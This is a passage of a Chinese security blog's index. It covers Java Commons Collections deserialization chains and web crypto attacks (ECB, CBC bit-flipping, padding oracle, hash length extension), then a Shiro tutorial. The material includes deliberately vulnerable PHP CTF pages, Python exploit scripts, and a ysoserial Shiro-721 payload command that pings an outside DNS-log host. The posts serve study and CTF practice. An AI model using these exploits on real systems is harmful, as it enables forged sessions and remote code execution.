&lt; table.length; index++) &#123; Entry&lt;?,?&gt; entry = table[index]; while (entry != null) &#123; entryStack = new Entry&lt;&gt;(0, entry.key, entry.value, entryStack); entry = entry.next; &#125; &#125; &#125; // Write out the key/value objects from the stacked entries while (entryStack != null) &#123; s.writeObject(entryStack.key); s.writeObject(entryStack.value); entryStack = entryStack.next; &#125;&#125; 1.为什么要调用两次put?2.为什么调用的两次put其中map中key的值分别为yy和zZ?3.为什么在调用完HashTable#put之后，还需要在map2中remove掉yy？详细原理可看此文章：https://paper.seebug.org/1242/#commons-collections-7 CommonsCollections8分析见这篇文章：https://www.anquanke.com/post/id/190472#h3-4 CommonsCollections8是今年navalorenzo推送到ysoserial上的，8与2，4的区别在于使用了新的readObject触发点TreeBag CommonsCollections9主要利用的是CommonsCollections:3.2版本新增的 DefaultedMap 来代替 LazyMap 3.2.2 版本使用了黑名单，禁止了 InvokerTransformer 类在序列化和反序列化的使用4.1 InvokerTransformer 和 InstantiateTransformer 两个类都没有实现 Serializable 接口 参考文章Ysoserial CommonsCollections1 详细分析：https://www.anquanke.com/post/id/230788ysoserial分析之CommonsCollections1Commons Collections 反序列化利用链分析：https://p2hm1n.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/ ysoserial CommonsCollections2 详细分析：https://www.anquanke.com/post/id/232592Java安全之反序列化篇-URLDNS&amp;Commons Collections 1-7反序列化链分析：https://paper.seebug.org/1242/","categories":[],"tags":[]},{"title":"WEB密码学攻击方式从0到1","slug":"B密码学攻击方式","date":"2021-03-01T16:08:31.000Z","updated":"2021-03-03T01:09:38.190Z","comments":true,"path":"article/4641618b.html","link":"","permalink":"https://blog.cfyqy.com/article/4641618b.html","excerpt":"ECB、CBC分组模式攻击方式和Hash长度扩展攻击","text":"ECB、CBC分组模式攻击方式和Hash长度扩展攻击 0x1基本概念0x1.1分组密码分组密码又称为分块加密或块加密，是一种对称加密算法，这类算法将明文分成多个等长的组，使用确定的算法和对称秘钥对每组分别加密或解密，常见的算法有DES、3DES、AES。 0x1.1.1 加密算法DES需要加密的明文按64位进行分组，加密密钥是根据用户输入的秘钥生成的，密钥长64位，但密钥事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位， 使得每个密钥都有奇数个1，在计算密钥时要忽略这8位），分组后的明文组和56位的密钥按位替代或交换的方法形成密文组的加密方法。 DES算法加密流程 ：（1）输入64位明文数据，并进行初始置换IP；（2）在初始置换IP后，明文数据再被分为左右两部分，每部分32位，以L0，R0表示；（3）在秘钥的控制下，经过16轮运算(f)；（4）16轮后，左、右两部分交换，并连接再一起，再进行逆置换；（5）输出64位密文。 由于DES密码长度容易被暴力破解，所以3DES算法通过对DES算法进行改进，增加DES的密钥长度来避免类似的攻击，针对每个数据块进行三次DES加密；因此，3DES加密算法并非什么新的加密算法，是DES的一个更安全的变形，它以DES为基本模块，通过组合分组方法设计出分组加密算法。该算法的加解密过程分别是对明文数据进行三次DES加密或解密,得到明文。 AES（Advanced Encryption Standard），在密码学中又称Rijndael加密法，是美国联邦政府采用的一种分组加密标准。这个标准用来替代原先的DES。在AES标准规范中，分组长度只能是128位，也就是说，每个分组为16个字节（每个字节8位）。密钥的长度可以使用128位、192位或256位。密钥的长度不同，推荐加密轮数也不同。 AES加密过程涉及到4种操作：字节替代、行移位、列混淆和轮密钥加。 0x1.1.2 分组模式在分组加密算法中，有ECB,CBC,CFB,OFB,CTR这几种算法模式。这里就对常见的ECB和CBC模式简单介绍。 ECB 模式全称为电子密码本模式（Electronic codebook），在ECB模式中，将明文分组加密之后的结果将直接成为密文分组。ECB加密：ECB解密：CBC 全称为密码分组链接（Cipher-block chaining） 模式。在CBC模式中，首先将明文分组与前一个密文分组进行XOR运算，然后再进行加密。第一个明文分组需要一个初始化向量(IV)进行XOR运算。CBC加密：CBC解密： 0x1.2Hash算法Hash是把任意长度的输入通过散列算法变换成固定长度的输出，该输出就是散列值。常见的hash算法有MD5、SHA1、SHA256 、SHA512等。MD5 算法的输入为长度小于 264 bit 的消息比特串，输出为固定 128 bit 的消息散列值，输入数据需要以 512 bit 为单位进行分组。 MD5的实现原理图：MD5实现步骤：（1）填充bits 如果输入message(bit)对512求余的结果不等于448，就需要填充使其结果等于448。补位二进制是在message的后面加上一个1，后面跟着 n 个0。在 16 进制下，需要在message后补80，就是 2 进制的10000000。填充完后，len(message)mod512=448(bit)。（2）补充长度补位之后，用64位来存储填充前信息长度。这64位加在第一步结果的后面。这样len(message)mod512=0。长度是小端存储的，也就是说高字节放在高地址中。例如要对 “hello world”进行填充：”hello world”是11个字母，11 byte (88 bit )，换算成16进制位0x58，其后跟着7个字节的0x00，则：（3）初始化向量初始链接变量 IV 在最开始存于 4 个 32 bit 的寄存器 A、B、C、D 中，将参与第一个分组单元的哈希运算，它们分别为：（4）复杂的函数运算 0x2 攻击方式0x2.1ECB模式攻击ECB将明文分组加密后直接成为密文分组，而密文则是由密文分组直接拼接而成。因为每个分组都独自进行加密解密，所以无需破解密文就能操纵部分明文，或者改变明文，在不知道加密算法的情况下得到密文，从而达到攻击效果。 例题：cbc.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?php//php7function AES($data)&#123; $privateKey = \"12345678123456781234567812345678\"; $encrypted=openssl_encrypt($data,'AES-128-ECB',$privateKey,OPENSSL_RAW_DATA); #$encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $privateKey, $data, MCRYPT_MODE_ECB); $encryptedData = (base64_encode($encrypted)); return $encryptedData;&#125;function DE__AES($data)&#123; $privateKey = \"12345678123456781234567812345678\"; $encryptedData = base64_decode($data); $decrypted=openssl_decrypt($encryptedData,'AES-128-ECB',$privateKey,OPENSSL_RAW_DATA); $decrypted = rtrim($decrypted, \"\") ; return $decrypted;&#125;if (@$_GET['a']=='reg')&#123; setcookie('uid', AES('9')); setcookie('username', AES($_POST['username'])); header(\"Location: http://127.0.0.1/ecb.php\"); exit();&#125;if (@!isset($_COOKIE['uid'])||@!isset($_COOKIE['username']))&#123; echo '&lt;form method=\"post\" action=\"ecb.php?a=reg\"&gt;Username:&lt;br&gt;&lt;input type=\"text\" name=\"username\"&gt;&lt;br&gt;Password:&lt;br&gt;&lt;input type=\"text\" name=\"password\" &gt;&lt;br&gt;&lt;br&gt;&lt;input type=\"submit\" value=\"注册\"&gt;&lt;/form&gt; ';&#125;else&#123; $uid = DE__AES($_COOKIE['uid']); if ( $uid != 4)&#123; echo 'uid:' .$uid .'&lt;br/&gt;'; echo 'Hi ' . DE__AES($_COOKIE['username']) .'&lt;br/&gt;'; echo 'You are not administrotor!!'; &#125; else &#123; echo \"Hi you are administrotor!!\" .'&lt;br/&gt;'; echo 'Flag is flag&#123;this is flag&#125;'; &#125;&#125;?&gt; 解题思路：以administrator权限登陆就就能获得Flag。判断权限则是根据cookie里面的uid参数，cookie包含username和uid两个参数，均为使用ECB加密的密文，然而username的密文是根据注册时的明文生成的 因此我们可以根据username的明文操纵生成我们想要的uid的密文。经过fuzz发现明文分组块为16个字节，那么我们注册17字节的用户，多出的那一个字节就可以是我们我们希望的UID的值，而此时我们查看username的密文增加部分就是UID的密文，即可伪造UID。 注册aaaaaaaaaaaaaaaa1获得1的密文分组,注册aaaaaaaaaaaaaaaa2获得2的密文分组，以此类推exp 1234567891011121314151617181920212223242526272829303132333435import urllibimport urllib2import base64import cookielibimport Cookiefor num in range(1,50): reg_url='http://127.0.0.1/ecb.php?a=reg' index_url='http://127.0.0.1/ecb.php' cookie=cookielib.CookieJar() opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie)) opener.addheaders.append(('User-Agent','Mozilla/5.0')) num=str(num) values=&#123;'username':'aaaaaaaaaaaaaaaa'+num,'password':'123'&#125; data=urllib.urlencode(values) opener.open(reg_url,data) text=opener.open(index_url,data) for ck in cookie: if ck.name=='username': user_name=ck.value user_name = urllib.unquote(user_name) user_name = base64.b64decode(user_name) hex_name = user_name.encode('hex') hex_name = hex_name[len(hex_name)/2:] hex_name = hex_name.decode('hex') uid = base64.b64encode(hex_name) uid = urllib.quote(uid) for ck in cookie: if ck.name=='uid': ck.value=uid text=opener.open(index_url).read() if 'Flag' in text: print text break else: print num 0x2.2CBC模式攻击0x2.2.1CBC 字节翻转攻击因为CBC模式是将前一个密文分组和明文分组进行混合加密,所以是可以避免ECB模式的弱点。 但正因为如此，导致解密时修改前一个密文分组就可以操纵后一个的解密后的明文分组，可以将前一个密文中的任意比特进行修改（0,1进行互换，也可以叫翻转） 因此CBC模式有两个攻击点： iv向量，影响第一个明文分组 第n个密文分组，影响第n+1个明文分组 密文通过block cipher encryption解密，得到中间密文，中间密文与IV(或前一个密文区块)异或后得到的是明文，因此可以通过攻击IV，来改变最终的明文。 IV的值该如何修改？可以简单的推理一下。解密过程中，因为中间密文 ^ 原始IV = 原始明文 ，所以中间密文=原始IV^原始明文。我们想要的伪造明文=中间密文^伪造IV = 原始IV^原始明文^伪造IV，可以推出伪造IV=原始IV^原始明文^伪造明文。随意我们只要知道原始IV和原始明文这两个值，就可以伪造解密后的结果。 举例：密文1[4]的意思是密文1字符串第4个字节，相当于数组下标。设：密文1[4] = A，中间密文2[4] = B，明文2[4] = C因为A ^ B = C，根据结论有B = A ^ C当人为修改A=A ^ C时，那么A ^ B = A ^ C ^ B = B ^ B = 0，这样明文2[4]的结果就为0了当人为修改A=A ^ C ^ x (x为任意数值)时，那么A ^ B = A ^ C ^ x ^ B = B ^ B ^ x = x，这是明文2[4] = x，这样就达到了控制明文某个字节的目的了。 例题：cbc.php 1234567891011121314151617181920212223242526272829303132333435&lt;?phperror_reporting(0);include(\"flag.php\");$iv = 'NGY0MWVlOGE2MGU4NTkxMQ==';function decode($str,$key,$iv)&#123; return openssl_decrypt(base64_decode($str),\"AES-128-CBC\",$key,OPENSSL_RAW_DATA,base64_decode($iv));&#125;function encode($str,$key,$iv)&#123; return base64_encode(openssl_encrypt($str,\"AES-128-CBC\",$key,OPENSSL_RAW_DATA, base64_decode($iv)));&#125;if(isset($_COOKIE['username']) &amp;&amp; isset($_COOKIE['iv']))&#123; if(decode($_COOKIE['username'],$key,$_COOKIE['iv']) === \"admin\")&#123; echo \"hello admin&lt;br&gt;\"; echo $flag.\"&lt;br&gt;\"; &#125; else if(decode($_COOKIE['username'],$key,$_COOKIE['iv']) === \"guest\")&#123; echo \"hello guest&lt;br&gt;\"; &#125; else &#123; echo \"iv or username error\"; &#125;&#125;else&#123; $enc = encode(\"guest\",$key,$iv); setcookie('username',$enc); setcookie('iv',$iv);&#125;highlight_file(__file__);?&gt; flag.php 1234&lt;?php$key = \"8bd54bcfe6a23fc0\";$flag = \"flag&#123;this_is_flag&#125;\";?&gt; 解题思路: 可以得到IV值和原本明文 “guest”,从源码中知，只要伪造明文 “admin”,即可得到flag，计算伪造IV值 123456789import base64iv = base64.b64decode('NGY0MWVlOGE2MGU4NTkxMQ==')admin = 'admin' + '\\x0b'*11guest = 'guest' + '\\x0b'*11new_iv = ''for i in range(len(admin)): new_iv += chr(ord(iv[i]) ^ ord(admin[i]) ^ ord(guest[i]))print base64.b64encode(new_iv)# Mnc8K39lOGE2MGU4NTkxMQ== 0x2.2.2CBC Padding Oracle 攻击分组密码Block Cipher需要在加载前确保每个每组的长度都是分组长度的整数倍。一般情况下，明文的最后一个分组很有可能会出现长度不足分组的长度:这个时候，普遍的做法是PKCS#5标准中定义的规则，在最后一个分组后填充一个固定的值，这个值的大小为填充的字节总数。即假如最后还差3个字符，则填充3个0×03 因为填充发生在最后一个分组，所以我们主要关注最后一个分组在Padding Oracle Attack攻击中，攻击者输入的参数是IV和Cipher，要通过对IV的”穷举”来请求服务器端对指定的Cipher进行解密，并对返回的结果进行判断,猜解出正确的中间密文，得到中间密文后，就可以伪造IV来伪造明文。比如在web应用中，如果Padding不正确，则应用程序很可能会返回500的错误(程序执行错误)；如果Padding正确，但解密出来的内容不正确，则可能会返回200的自定义错误(这只是业务上的规定)，所以，这种区别就可以成为一个二值逻辑的”注入点”。详情可看此文章：https://www.freebuf.com/articles/web/15504.html 利用条件： 攻击者知道密文和初始向量IV padding错误和padding正确服务器可返回不一样的状态 以Shiro padding oracle 为例： Shiro的 RememberMe 使用 AES-128-CBC 模式加密，容易受到 Padding Oracle 攻击，AES 的初始化向量 IV 就是cookie的 rememberMe base64 解码后的前16个字。 Shrio要有Oracle Padding漏洞，有填充提示 接受正确的密文（填充正确包含合法值），应用程序返回HTTP 200 接受非法的密文（解密后填充不正确），应用程序返回HTTP 500，返回框架错误页面 接受合法的密文（填充正确，值不合法），应用程序显示自定义错误HTTP 200，但是有返回自定义错误页面 实际上不是原本的请求，都不满足第一条，所以只要填充正确和填充不正确返回不同就可以了。 漏洞环境搭建 1234git clone https://github.com/3ndz/Shiro-721.gitcd Shiro-721/Dockerdocker build -t shiro-721 .docker run -p 8080:8080 -d shiro-721 1.登录 Shiro 测试账户获取合法 Cookie（勾选Remember Me）2.生成java payload 1java -jar ysoserial.jar CommonsBeanutils1 \"ping awa4xw.ceye.io\" &gt; payload.class 3.执行exp，经过了几十分钟的爆破，得到padding oracle attack后的cookie 1python2 shiro_exp.py http://192.168.247.130:8080/ NqoZZVVnFvBxH0m7tavNPhx2H2mPLucccvcuM3WSSIQIWyksw3xnNG70MWsSy+TFCUZEkiQSdV38fTmfJgsuEJPFLUrVQUwDkZ+disZ5k1auCE2swMsLE7cUxDykdPk79k6Q0k6N8rZpszd/1+F6uoA8PDH9zaYt7RwXUS2z+JKFV30Cl7h0zZvlKYK98DrITFX8sW0Z/veIgh6G3ljIAIo6CgRUKMwYsi1dfD+HeE5qxTpofOfyuUnkguzY//gvEahmxWy85qMBgSchENUn+aKOFWnrtEvTQ3bOhN3T5Lb2zz0waCSpFEyC+tBDYxUWiiANjJnkUf/KtOZ/tQheAjZezmBymL5qOQJPMaVuGyQtX7AGIhn3r3wrLdQsCog4NzCM5EcaNV4zuGEXL4Mfnk0xh7Lv4O04c931gCRM6zv5hB743NwjdO72hc1TcC/CYLRjfs5rUWHerNClnBJhw5h+pQuJdZ0qsv95aC0Qeh4ywpQKELPfpbuZNEd1zt75 payload.class 4.复制该cookie，然后重放一下数据库，即可成功执行命令 0x2.3Hash长度扩展攻击Hash长度扩展攻击可以在知道HASH(message(salt+data))的hash值得情况下，算出HASH(message+padding+a)的hash值，就是根据短的消息的hash算出更长的消息的hash。利用条件： 知道salt的长度 要知道一个由salt加密后的hash值 知道data的值(未加盐的明文) 例题： hash.php 1234567891011121314151617181920&lt;?phpinclude \"secret.php\";@$username=(string)$_POST['username'];function enc($text)&#123; global $key; return md5($key.$text);&#125;if(enc($username) === $_COOKIE['verify'])&#123; if(is_numeric(strpos($username, \"admin\")))&#123; die($flag); &#125; else&#123; die(\"you are not admin\"); &#125;&#125;else&#123; setcookie(\"verify\", enc(\"guest\"), time()+60*60*24*7); setcookie(\"len\", strlen($key), time()+60*60*24*7);&#125;show_source(__FILE__); secret.php 1234&lt;?php$key='123456789qwertyuiopasdfghjklzxcvbnm12345671475';$flag='flag&#123;this_1s_a_f1ag&#125;';?&gt; 解题思路：可以得到enc(“guest”)的值 ,$key的长度为46,要求我们输入的username在经过enc函数加密之后，与$_COOKIE[‘verify’]的值相等，并且username中必须含有admin。 使用hashdump工具 12345git clone https://github.com/bwall/HashPumpapt-get install g++ libssl-devcd HashPumpmakemake install 用法 1234Input Signature: 已知的hash值，这里是$_COOKIE['verify']的值Input Data: 上面的hash值解密后的字符串，这里是guest。Input Key Length: $key的长度Input Data to Add: 想要添加的数据，由于题目要求要含有admin，所以这里是admin。 然后我们将得到的hash值去替换数据包中$_COOKIE[‘verify’]的值，然后post提交username=guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin即可。 0x3 总结这里简单介绍了常见的WEB密码学攻击方式，如有错误的地方欢迎指正。 参考链接：https://ciphersaw.me/2017/11/12/Hash%20Length%20Extension%20Attack%EF%BC%88%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%EF%BC%89/https://www.anquanke.com/post/id/84724https://www.freebuf.com/articles/web/15504.html","categories":[],"tags":[],"author":"ye1s"},{"title":"英语语法学习","slug":"英语语法","date":"2021-02-28T03:54:34.000Z","updated":"2021-02-28T03:56:41.705Z","comments":true,"path":"article/81c4e30a.html","link":"","permalink":"https://blog.cfyqy.com/article/81c4e30a.html","excerpt":"语法学习，还是要提升一下英语啦！","text":"语法学习，还是要提升一下英语啦！ 初级语法","categories":[],"tags":[],"author":"ye1s"},{"title":"shiro简单学习","slug":"shiro简单学习","date":"2021-02-26T02:00:44.000Z","updated":"2021-02-27T03:51:41.287Z","comments":true,"path":"article/35357a3b.html","link":"","permalink":"https://blog.cfyqy.com/article/35357a3b.html","excerpt":"shiro学习","text":"shiro学习 慕课视频：https://www.imooc.com/video/16952 Shiro认证，授权，自定义RealmShiro认证pom.xml 1234567891011121314151617181920212223242526272829303132333435&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.ye1s&lt;/groupId&gt; &lt;artifactId&gt;ye1s-shrio&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-core&lt;/artifactId&gt; &lt;version&gt;1.4.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;version&gt;1.7.30&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-simple&lt;/artifactId&gt; &lt;version&gt;1.7.5&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; AuthenticationTest.java 123456789101112131415161718192021222324252627282930313233343536373839import org.apache.shiro.SecurityUtils;import org.apache.shiro.authc.UsernamePasswordToken;import org.apache.shiro.mgt.DefaultSecurityManager;import org.apache.shiro.realm.SimpleAccountRealm;import org.apache.shiro.subject.Subject;import org.junit.Before;import org.junit.Test;public class AuthenticationTest &#123; SimpleAccountRealm simpleAccountRealm=new SimpleAccountRealm(); @Before public void addUser()&#123; simpleAccountRealm.addAccount(\"admin\",\"password\"); &#125; @Test public void testAuthentication()&#123; //构建SecurityManager环境 DefaultSecurityManager defaultSecurityManager=new DefaultSecurityManager(); defaultSecurityManager.setRealm(simpleAccountRealm); //提交主题认证请求 SecurityUtils.setSecurityManager(defaultSecurityManager); Subject subject=SecurityUtils.getSubject(); UsernamePasswordToken usernamePasswordToken=new UsernamePasswordToken(\"admin\",\"password\"); subject.login(usernamePasswordToken); System.out.println(\"isAuthenticated is:\" +subject.isAuthenticated()); subject.logout(); System.out.println(\"isAuthenticated is:\" +subject.isAuthenticated()); &#125;&#125;/*result:isAuthenticated is:trueisAuthenticated is:false */ Shrio授权 1234567891011121314151617181920212223public class AuthenticationTest &#123; SimpleAccountRealm simpleAccountRealm=new SimpleAccountRealm(); @Before public void addUser()&#123; simpleAccountRealm.addAccount(\"admin\",\"password\",\"admin\",\"user\"); &#125; @Test public void testAuthentication()&#123; //构建SecurityManager环境 DefaultSecurityManager defaultSecurityManager=new DefaultSecurityManager(); defaultSecurityManager.setRealm(simpleAccountRealm); //提交主题认证请求 SecurityUtils.setSecurityManager(defaultSecurityManager); Subject subject=SecurityUtils.getSubject(); UsernamePasswordToken usernamePasswordToken=new UsernamePasswordToken(\"admin\",\"password\"); subject.login(usernamePasswordToken); System.out.println(\"isAuthenticated is:\" +subject.isAuthenticated()); subject.checkRoles(\"admin\",\"user\"); &#125; IniRealmuser.ini 1234[users]admin=password,admin[roles]admin=user:delete,user:update IniRealmTest.java 123456789101112131415161718192021public class IniRealmTest &#123; @Test public void testAuthentication()&#123; IniRealm iniRealm=new IniRealm(\"classpath:user.ini\"); //构建SecurityManager环境 DefaultSecurityManager defaultSecurityManager=new DefaultSecurityManager(); defaultSecurityManager.setRealm(iniRealm); //提交主题认证请求 SecurityUtils.setSecurityManager(defaultSecurityManager); Subject subject=SecurityUtils.getSubject(); UsernamePasswordToken usernamePasswordToken=new UsernamePasswordToken(\"admin\",\"password\"); subject.login(usernamePasswordToken); System.out.println(\"isAuthenticated is:\" +subject.isAuthenticated()); subject.checkRole(\"admin\"); subject.checkPermissions(\"user:delete\",\"user:update\"); &#125;&#125; JdbcRealmTestsql 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253SET NAMES utf8mb4;SET FOREIGN_KEY_CHECKS = 0;-- ------------------------------ Table structure for roles_permissions-- ----------------------------DROP TABLE IF EXISTS `roles_permissions`;CREATE TABLE `roles_permissions` ( `id` int(11) NOT NULL DEFAULT 0, `role_name` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `permission` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, PRIMARY KEY (`id`) USING BTREE) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;-- ------------------------------ Records of roles_permissions-- ----------------------------INSERT INTO `roles_permissions` VALUES (1, 'system', 'update');-- ------------------------------ Table structure for user_roles-- ----------------------------DROP TABLE IF EXISTS `user_roles`;CREATE TABLE `user_roles` ( `id` int(11) NOT NULL DEFAULT 0, `username` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `role_name` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, PRIMARY KEY (`id`) USING BTREE) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;-- ------------------------------ Records of user_roles-- ----------------------------INSERT INTO `user_roles` VALUES (1, 'admin', 'system');-- ------------------------------ Table structure for users-- ----------------------------DROP TABLE IF EXISTS `users`;CREATE TABLE `users` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `password` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `password_salt` int(11) NULL DEFAULT NULL, PRIMARY KEY (`id`) USING BTREE) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;-- ------------------------------ Records of users-- ----------------------------INSERT INTO `users` VALUES (1, 'admin', '666', NULL);SET FOREIGN_KEY_CHECKS = 1; pom.xml添加相关依赖 12345678910&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.45&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;1.1.6&lt;/version&gt;&lt;/dependency&gt; JdbcRealmTest.java 1234567891011121314151617181920212223242526272829public class JdbcRealmTest &#123; DruidDataSource dataSource=new DruidDataSource(); &#123; dataSource.setUrl(\"jdbc:mysql://localhost:3306/test?useSSL=false\"); dataSource.setUsername(\"root\"); dataSource.setPassword(\"w0nd4rful\"); &#125; @Test public void testAuthentication()&#123; JdbcRealm jdbcRealm=new JdbcRealm(); jdbcRealm.setDataSource(dataSource); jdbcRealm.setPermissionsLookupEnabled(true); //构建SecurityManager环境 DefaultSecurityManager defaultSecurityManager=new DefaultSecurityManager(); defaultSecurityManager.setRealm(jdbcRealm); //提交主题认证请求 SecurityUtils.setSecurityManager(defaultSecurityManager); Subject subject=SecurityUtils.getSubject(); UsernamePasswordToken usernamePasswordToken=new UsernamePasswordToken(\"admin\",\"666\"); subject.login(usernamePasswordToken); System.out.println(\"isAuthenticated is:\" +subject.isAuthenticated()); &#125;&#125; 自定义RealmCustomRealm.java 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public class CustomRealm extends AuthorizingRealm &#123; Map&lt;String,String &gt; userMap=new HashMap&lt;String, String&gt;(16); &#123; userMap.put(\"admin\",\"password\"); super.setName(\"customRealm\"); &#125; protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) &#123; String userName=(String)principalCollection.getPrimaryPrincipal(); Set&lt;String&gt; roles=getRolesByUserName(userName); Set&lt;String&gt; permissions=getPermissionsByUserName(userName); SimpleAuthorizationInfo authorizationInfo=new SimpleAuthorizationInfo(); authorizationInfo.addRoles(roles); authorizationInfo.addStringPermissions(permissions); return authorizationInfo; &#125; private Set&lt;String&gt; getPermissionsByUserName(String userName) &#123; Set&lt;String&gt; sets=new HashSet&lt;String&gt;(); sets.add(\"user:delete\"); sets.add(\"user:update\"); return sets; &#125; protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException &#123; //1.从主体传过来的信息中获取用户名 String userName=(String)authenticationToken.getPrincipal(); //通过用户名到数据中获取数据 String password=getPasswordByUserName(userName); if (password==null)&#123; return null; &#125; SimpleAuthenticationInfo authenticationInfo=new SimpleAuthenticationInfo(userName,password,\"customRealm\"); return authenticationInfo; &#125; //模拟数据库获取 private String getPasswordByUserName(String userName)&#123; return userMap.get(userName); &#125; private Set&lt;String&gt; getRolesByUserName(String UserName)&#123; Set&lt;String&gt; sets= new HashSet&lt;String&gt;(); sets.add(\"admin\"); sets.add(\"users\"); return sets; &#125;&#125; CustomRealmTest.java 123456789101112131415161718192021public class CustomRealmTest &#123; @Test public void testAuthentication()&#123; CustomRealm customRealm=new CustomRealm(); //构建SecurityManager环境 DefaultSecurityManager defaultSecurityManager=new DefaultSecurityManager(); defaultSecurityManager.setRealm(customRealm); //提交主题认证请求 SecurityUtils.setSecurityManager(defaultSecurityManager); Subject subject=SecurityUtils.getSubject(); UsernamePasswordToken usernamePasswordToken=new UsernamePasswordToken(\"admin\",\"password\"); subject.login(usernamePasswordToken); System.out.println(\"isAuthenticated is:\" +subject.isAuthenticated()); subject.checkRole(\"admin\"); subject.checkPermissions(\"user:delete\"); &#125;&#125; Shiro加密CustomRealm.java 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public class CustomRealm extends AuthorizingRealm &#123; Map&lt;String,String &gt; userMap=new HashMap&lt;String, String&gt;(16); &#123; userMap.put(\"admin\",getHash(\"password\")); super.setName(\"customRealm\"); &#125; protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) &#123; String userName=(String)principalCollection.getPrimaryPrincipal(); Set&lt;String&gt; roles=getRolesByUserName(userName); Set&lt;String&gt; permissions=getPermissionsByUserName(userName); SimpleAuthorizationInfo authorizationInfo=new SimpleAuthorizationInfo(); authorizationInfo.addRoles(roles); authorizationInfo.addStringPermissions(permissions); return authorizationInfo; &#125; protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException &#123; //1.从主体传过来的信息中获取用户名 String userName=(String)authenticationToken.getPrincipal(); //通过用户名到数据中获取数据 String password=getPasswordByUserName(userName); if (password==null)&#123; return null; &#125; SimpleAuthenticationInfo authenticationInfo=new SimpleAuthenticationInfo(userName,password,\"customRealm\"); authenticationInfo.setCredentialsSalt(ByteSource.Util.bytes(\"ye1s\")); return authenticationInfo; &#125; //模拟数据库获取 private String getPasswordByUserName(String userName)&#123; return userMap.get(userName); &#125; private Set&lt;String&gt; getRolesByUserName(String UserName)&#123; Set&lt;String&gt; sets= new HashSet&lt;String&gt;(); sets.add(\"admin\"); sets.add(\"users\"); return sets; &#125; private Set&lt;String&gt; getPermissionsByUserName(String userName) &#123; Set&lt;String&gt; sets=new HashSet&lt;String&gt;(); sets.add(\"user:delete\"); sets.add(\"user:update\"); return sets; &#125; private String getHash(String password)&#123; Md5Hash md5Hash=new Md5Hash(\"password\",\"ye1s\"); return md5Hash.toString(); &#125;&#125; CustomRealmTest.java 1234567891011121314151617181920212223242526public class CustomRealmTest &#123; @Test public void testAuthentication()&#123; CustomRealm customRealm=new CustomRealm(); //构建SecurityManager环境 DefaultSecurityManager defaultSecurityManager=new DefaultSecurityManager(); defaultSecurityManager.setRealm(customRealm); HashedCredentialsMatcher matcher=new HashedCredentialsMatcher(); matcher.setHashAlgorithmName(\"md5\"); matcher.setHashIterations(1); customRealm.setCredentialsMatcher(matcher); //提交主题认证请求 SecurityUtils.setSecurityManager(defaultSecurityManager); Subject subject=SecurityUtils.getSubject(); UsernamePasswordToken usernamePasswordToken=new UsernamePasswordToken(\"admin\",\"password\"); subject.login(usernamePasswordToken); System.out.println(\"isAuthenticated is:\" +subject.isAuthenticated()); subject.checkRole(\"admin\"); subject.checkPermissions(\"user:delete\"); &#125;&#125; Shiro集成SpringShiro过滤器 Shiro 